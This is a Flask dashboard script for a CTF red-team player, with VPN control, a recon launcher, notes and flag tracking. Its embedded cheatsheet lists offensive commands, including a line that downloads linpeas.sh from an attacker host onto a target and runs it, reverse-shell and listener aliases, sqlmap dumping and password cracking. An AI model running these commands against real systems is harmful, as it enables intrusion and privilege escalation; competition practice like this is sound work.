#!/usr/bin/env python3
# CyberKent Red Team — cybermentor operatsiya konsoli (v2)
import os, subprocess, functools, secrets, re
from flask import Flask, request, session, redirect, Response, jsonify

app = Flask(__name__)
CFG = os.path.expanduser("~/.panel"); os.makedirs(CFG, exist_ok=True)
HOME = os.path.expanduser("~")
sk = os.path.join(CFG, "secret")
if not os.path.exists(sk): open(sk, "w").write(secrets.token_hex(32))
app.secret_key = open(sk).read().strip()
PW_FILE = os.path.join(CFG, "pass")
PASSWORD = open(PW_FILE).read().strip() if os.path.exists(PW_FILE) else "changeme"
NOTES = os.path.join(HOME, "ctf", "notes.md")

def sh(cmd, timeout=20):
    try: return subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout).stdout.strip()
    except Exception as e: return f"err: {e}"

def login_required(f):
    @functools.wraps(f)
    def w(*a, **k):
        if not session.get("ok"): return redirect("login")
        return f(*a, **k)
    return w

@app.route("/login", methods=["GET", "POST"])
def login():
    err = ""
    if request.method == "POST":
        if request.form.get("password") == PASSWORD:
            session["ok"] = True; return redirect(".")
        err = "❌ Noto'g'ri parol"
        ip = request.headers.get("X-Forwarded-For", request.remote_addr)
        open(os.path.join(CFG, "attempts.log"), "a").write(f"{sh('date +%H:%M:%S')} FAIL {ip}\n")
    return Response(LOGIN_HTML.replace("{{err}}", err), mimetype="text/html")

@app.route("/logout")
def logout(): session.clear(); return redirect("login")

@app.route("/")
@login_required
def index(): return Response(DASH_HTML, mimetype="text/html")

@app.route("/api/status")
@login_required
def status():
    tun = sh("ip -4 addr show tun0 2>/dev/null | grep -oP 'inet \\K[0-9.]+'")
    svcs = {s: sh(f"systemctl is-active {s} 2>/dev/null") for s in
            ["code-server@ubuntu", "nginx", "filebrowser", "fail2ban", "panel"]}
    failed = sh("sudo grep -c 'Failed password' /var/log/auth.log 2>/dev/null || echo 0")
    lastb = sh("sudo lastb -n 5 2>/dev/null | head -5")
    banned = sh("sudo fail2ban-client status sshd 2>/dev/null | grep -i 'banned IP' || echo '-'")
    attempts = sh(f"tail -5 {os.path.join(CFG,'attempts.log')} 2>/dev/null")
    flags = sh("cat ~/ctf/flags.txt 2>/dev/null")
    targets = sh("ls ~/ctf/targets 2>/dev/null | tr '\\n' ' '")
    ovpn = "bor ✓" if os.path.exists(os.path.join(HOME, "cyberkent.ovpn")) else "yo'q (yuklang)"
    return jsonify(dict(vpn_up=bool(tun), attack_ip=tun or "-", svcs=svcs, failed=failed,
        lastb=lastb, banned=banned, attempts=attempts, flags=flags or "(hali yo'q)",
        targets=targets or "-", ovpn=ovpn))

@app.route("/api/vpn/<action>", methods=["POST"])
@login_required
def vpn(action):
    if action == "connect":
        cfg = os.path.join(HOME, "cyberkent.ovpn")
        if not os.path.exists(cfg): return jsonify(msg="❌ ~/cyberkent.ovpn topilmadi")
        sh("sudo pkill -f 'openvpn --config' 2>/dev/null; sleep 1")
        sh(f"sudo openvpn --config {cfg} --daemon --log {HOME}/vpn.log --writepid {HOME}/vpn.pid", timeout=10)
        return jsonify(msg="🔌 Ulanmoqda... 8s kutib yangilang")
    if action == "disconnect":
        sh("sudo pkill -f 'openvpn --config'"); return jsonify(msg="🔴 Uzildi")
    return jsonify(msg="?")

@app.route("/api/notes", methods=["GET", "POST"])
@login_required
def notes():
    if request.method == "POST":
        os.makedirs(os.path.dirname(NOTES), exist_ok=True)
        open(NOTES, "w").write(request.form.get("text", "")[:100000])
        return jsonify(msg="💾 saqlandi")
    return jsonify(text=open(NOTES).read() if os.path.exists(NOTES) else "")

@app.route("/api/recon", methods=["POST"])
@login_required
def recon():
    t = request.form.get("target", "").strip()
    if not re.fullmatch(r"[A-Za-z0-9.\-]{1,64}", t):
        return jsonify(msg="❌ Noto'g'ri target (faqat IP/host)")
    # foydali PATH bilan fon rejimida
    sh(f"cd {HOME} && setsid nohup bash -lc 'PATH=$HOME/.local/bin:/usr/local/bin:$PATH recon {t}' >{HOME}/ctf/targets/_last.log 2>&1 &", timeout=8)
    return jsonify(msg=f"🚀 recon {t} ishga tushdi (fon). Natija 20-60s ichida.")

@app.route("/api/recon/result")
@login_required
def recon_result():
    t = request.args.get("t", "")
    if not re.fullmatch(r"[A-Za-z0-9.\-]{1,64}", t): return jsonify(out="")
    d = os.path.join(HOME, "ctf", "targets", t)
    q = os.path.join(d, "nmap-quick.txt")
    out = sh(f"grep -E 'open' {q} 2>/dev/null | grep -v Warning | head -30") if os.path.exists(q) else "(hali natija yo'q — kutib qayta bosing)"
    webs = sh(f"ls {d}/gobuster-* 2>/dev/null | xargs -r -I{{}} sh -c 'echo === {{}} ===; head -8 {{}}'")
    return jsonify(out=out, web=webs)

LOGIN_HTML = """<!doctype html><html><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1">
<title>CyberKent // Kirish</title><style>*{box-sizing:border-box}body{background:#0a0e0a;color:#00ff41;font-family:'Courier New',monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
.box{border:1px solid #00ff41;padding:40px;box-shadow:0 0 30px #00ff4133;width:340px;max-width:90vw}h1{font-size:20px;letter-spacing:2px;text-align:center}
.sub{color:#0a8;font-size:11px;text-align:center;margin-bottom:20px}input{width:100%;background:#000;border:1px solid #00ff41;color:#00ff41;padding:12px;font-family:inherit;margin:8px 0}
button{width:100%;background:#00ff41;color:#000;border:0;padding:12px;font-weight:bold;cursor:pointer;font-family:inherit}.err{color:#ff3355;font-size:12px;text-align:center;margin-top:8px}</style></head>
<body><form class=box method=post><h1>&#9760; CYBERKENT RED TEAM</h1><div class=sub>cybermentor // secure access</div>
<input type=password name=password placeholder="parol" autofocus><button>KIRISH</button><div class=err>{{err}}</div></form></body></html>"""

DASH_HTML = """<!doctype html><html><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1">
<title>CyberKent // Konsol</title><style>*{box-sizing:border-box}body{background:#0a0e0a;color:#c8ffd0;font-family:'Courier New',monospace;margin:0;padding:16px}
a{color:#00ff41;text-decoration:none}h1{color:#00ff41;letter-spacing:2px;font-size:20px;margin:4px 0}
.top{display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #00ff4133;padding-bottom:10px;margin-bottom:14px;flex-wrap:wrap;gap:8px}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:14px}
.card{border:1px solid #00ff4133;padding:14px;background:#0d130d}.card h2{color:#00ff41;font-size:13px;letter-spacing:1px;margin:0 0 10px;border-bottom:1px dashed #00ff4122;padding-bottom:6px}
.big{font-size:19px;font-weight:bold}.on{color:#00ff41}.off{color:#ff3355}
button{background:#00ff41;color:#000;border:0;padding:8px 14px;font-family:inherit;font-weight:bold;cursor:pointer;margin:3px}button.red{background:#ff3355;color:#fff}
input,textarea{background:#000;border:1px solid #00ff4166;color:#00ff41;font-family:inherit;padding:8px;width:100%}textarea{min-height:120px;resize:vertical}
pre{white-space:pre-wrap;font-size:11px;color:#7fd68f;margin:6px 0;max-height:200px;overflow:auto}
.links a{display:inline-block;border:1px solid #00ff41;padding:8px 12px;margin:4px 4px 0 0}.pill{padding:2px 8px;border-radius:10px;font-size:11px}.pillon{background:#00ff4122;color:#00ff41}.pilloff{background:#ff335522;color:#ff3355}
.tabs{margin:6px 0}.tabs button{background:#0d130d;color:#00ff41;border:1px solid #00ff4144}details{margin:4px 0}summary{cursor:pointer;color:#00ff41}</style></head><body>
<div class=top><h1>&#9760; CYBERKENT RED TEAM — OPERATSIYA KONSOLI</h1><div><span id=clock></span> &nbsp;<a href=logout>[chiqish]</a></div></div>
<div class=grid>
<div class=card><h2>&#128225; VPN — HUJUM ULANISHI</h2><div>Holat: <span id=vpnstate class=big>...</span></div>
  <div>Attack IP: <span id=attackip class=big>-</span></div><div style=margin-top:4px>.ovpn: <span id=ovpn>-</span></div>
  <div style=margin-top:8px><button onclick=vpnAct('connect')>CONNECT</button><button class=red onclick=vpnAct('disconnect')>DISCONNECT</button></div>
  <div id=vpnmsg style=color:#ffd23f;font-size:12px;margin-top:6px></div></div>
<div class=card><h2>&#127919; RECON LAUNCHER</h2><input id=rectarget placeholder="target IP (masalan 10.10.10.5)">
  <div style=margin-top:6px><button onclick=recon()>RECON BOSHLASH</button><button onclick=recinfo() style=background:#0d130d;color:#00ff41;border:1px solid #00ff41>NATIJA</button></div>
  <div id=recmsg style=color:#ffd23f;font-size:12px;margin-top:6px></div><pre id=recout></pre></div>
<div class=card><h2>&#9881; XIZMATLAR</h2><div id=svcs>...</div></div>
<div class=card><h2>&#128737; XAVFSIZLIK</h2><div>Failed SSH: <span id=failed class=big>-</span> &nbsp; Fail2ban: <span id=banned></span></div>
  <div style=margin-top:4px>lastb:</div><pre id=lastb>-</pre><div>Panel urinishlari:</div><pre id=attempts>-</pre></div>
<div class=card><h2>&#128221; NOTES (eslatma/parollar)</h2><textarea id=notes placeholder="creds, yo'l, g'oyalar..."></textarea>
  <button onclick=saveNotes() style=margin-top:6px>SAQLASH</button><span id=notemsg style=color:#ffd23f;font-size:12px></span></div>
<div class=card><h2>&#127988; TARGETLAR & FLAGLAR</h2><div>Targetlar: <span id=targets>-</span></div><div style=margin-top:4px>Flaglar:</div><pre id=flags>-</pre></div>
<div class=card><h2>&#128214; CHEATSHEET</h2>
  <details><summary>Web</summary><pre>ffuf -u http://T/FUZZ -w ~/wordlists/common.txt
gobuster dir -u http://T -w ~/wordlists/directory-list-2.3-medium.txt
sqlmap -u "http://T/p?id=1" --batch --dump
nuclei -u http://T   |   nikto -h T   |   wpscan --url http://T</pre></details>
  <details><summary>Pwn</summary><pre>checksec --file=./bin ; file ./bin
python3 -c 'from pwn import *; p=remote("T",PORT)'
ROPgadget --binary ./bin | grep 'pop rdi'   ;   gdb ./bin (GEF)</pre></details>
  <details><summary>Crypto</summary><pre>RsaCtfTool --publickey key.pub --uncipher ...
python3 (from Crypto..., gmpy2, sympy)   ;   hashcat -m 0 h.txt rockyou   ;   john --wordlist=~/wordlists/rockyou.txt h</pre></details>
  <details><summary>Tarmoq</summary><pre>tshark -r cap.pcap -Y http   ;   tcpdump -r cap.pcap
strings cap.pcap | grep -i flag   ;   termshark cap.pcap</pre></details>
  <details><summary>Stego</summary><pre>steghide extract -sf img.jpg   ;   stegseek img.jpg ~/wordlists/rockyou.txt
zsteg img.png   ;   binwalk -e file   ;   exiftool img   ;   zbarimg qr.png</pre></details>
  <details><summary>Shell/Privesc</summary><pre>revshell 4444   ;   listen 4444   ;   serve
target: wget http://LHOST:8000/linpeas.sh -O /tmp/l.sh; bash /tmp/l.sh
stabilize: python3 -c 'import pty;pty.spawn("/bin/bash")'; Ctrl+Z; stty raw -echo; fg</pre></details></div>
<div class=card><h2>&#127942; CYBERKENT (musobaqa)</h2><div class=links>
  <a href="https://red.cyberkent.uz/challenges" target=_blank>🎯 Challenges</a>
  <a href="https://red.cyberkent.uz/scoreboard" target=_blank>📊 Natijalar</a>
  <a href="https://red.cyberkent.uz/teams" target=_blank>👥 Jamoalar</a>
  <a href="https://red.cyberkent.uz/vpn" target=_blank>🔌 VPN</a>
  <a href="https://red.cyberkent.uz" target=_blank>🏠 Bosh sahifa</a></div>
  <div style=margin-top:8px;font-size:11px;color:#7fd68f>Yangi oynada ochiladi — o'sha yerda login qiling</div></div>
<div class=card><h2>&#128279; MENING ASBOBLARIM</h2><div class=links><a href="/">💻 IDE</a><a href="/files/">📁 Fayllar</a><a href="/cyberchef/">🔧 CyberChef</a></div>
  <div style=margin-top:8px;font-size:11px;color:#7fd68f>Terminal: vpn-connect · recon · revshell · listen · serve · flag</div></div>
</div>
<script>
function clk(){document.getElementById('clock').textContent=new Date().toLocaleTimeString()}setInterval(clk,1000);clk();
async function load(){let d=await(await fetch('api/status')).json();
 let v=document.getElementById('vpnstate');v.textContent=d.vpn_up?'🟢 ULANGAN':'🔴 UZILGAN';v.className='big '+(d.vpn_up?'on':'off');
 attackip.textContent=d.attack_ip;ovpn.textContent=d.ovpn;failed.textContent=d.failed;banned.textContent=d.banned;
 lastb.textContent=d.lastb||'-';attempts.textContent=d.attempts||'(yo\\'q)';targets.textContent=d.targets;flags.textContent=d.flags;
 let s='';for(let k in d.svcs){let up=d.svcs[k]=='active';s+=`<div>${k.replace('@ubuntu','')} <span class="pill ${up?'pillon':'pilloff'}">${d.svcs[k]}</span></div>`}svcs.innerHTML=s;}
async function vpnAct(a){vpnmsg.textContent='...';let d=await(await fetch('api/vpn/'+a,{method:'POST'})).json();vpnmsg.textContent=d.msg;setTimeout(load,8000)}
async function recon(){let t=rectarget.value.trim();if(!t)return;recmsg.textContent='...';let d=await(await fetch('api/recon',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'target='+encodeURIComponent(t)})).json();recmsg.textContent=d.msg;setTimeout(recinfo,25000)}
async function recinfo(){let t=rectarget.value.trim();if(!t)return;let d=await(await fetch('api/recon/result?t='+encodeURIComponent(t))).json();recout.textContent=(d.out||'')+'\\n'+(d.web||'')}
async function saveNotes(){let d=await(await fetch('api/notes',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'text='+encodeURIComponent(notes.value)})).json();notemsg.textContent=d.msg;setTimeout(()=>notemsg.textContent='',2000)}
async function loadNotes(){let d=await(await fetch('api/notes')).json();notes.value=d.text||''}
load();loadNotes();setInterval(load,7000);
</script></body></html>"""

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=8090)
